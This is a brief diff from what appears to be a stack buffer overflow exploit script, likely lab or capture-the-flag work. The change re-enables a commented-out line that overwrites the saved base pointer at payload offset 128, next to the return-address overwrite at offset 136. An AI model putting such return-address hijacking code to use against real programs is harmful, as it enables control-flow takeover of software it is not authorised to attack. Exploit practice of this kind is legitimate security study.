@@ -50,8 +50,7 @@ bp_addr= bp_addr.to_bytes(8, byteorder="little")
 
 # set the address
 # base stack pointer
-# I misunderstood, no need to do this
-#payload[128:136] = bp_addr #0x20
+payload[128:136] = bp_addr #0x20
 # return stack pointer
 payload[136:144] = ret_addr  #0x20
 
